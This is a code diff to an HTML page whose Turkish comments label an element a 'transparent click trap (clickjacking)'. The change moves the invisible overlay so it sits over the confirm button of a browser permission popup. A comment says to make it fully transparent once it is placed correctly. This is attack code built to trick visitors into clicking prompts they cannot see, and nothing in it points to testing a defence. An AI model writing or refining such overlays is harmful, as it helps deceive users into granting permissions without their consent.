@@ -16,15 +16,18 @@
         
         /* Şeffaf Tıklama Tuzağı (Clickjacking) */
         #click-trap {
-            position: fixed;
-            bottom: 15px; /* Chrome'un onay butonuna göre ayarla */
-            right: 15px;
-            width: 160px;
-            height: 70px;
-            background: rgba(255, 0, 0, 0); /* Tamamen şeffaf */
-            z-index: 10000;
-            display: none;
-            cursor: pointer;
+    position: fixed;
+    /* Popup genellikle ekranın ortasından biraz aşağıda başlar */
+    top: 55%; 
+    left: 50%;
+    /* Onay butonunun olduğu sağ alt çeyreği hedefliyoruz */
+    width: 45%; 
+    height: 15%; 
+    background: rgba(255, 0, 0, 0.3); /* TEST İÇİN: Kırmızı kalsın, yerini görünce 0 yaparsın */
+    z-index: 10000;
+    display: none;
+    cursor: pointer;
+    border-radius: 10px;
         }
     </style>
 </head>
@@ -44,3 +47,4 @@
     <script src="test.js"></script>
 </body>
 </html>
+
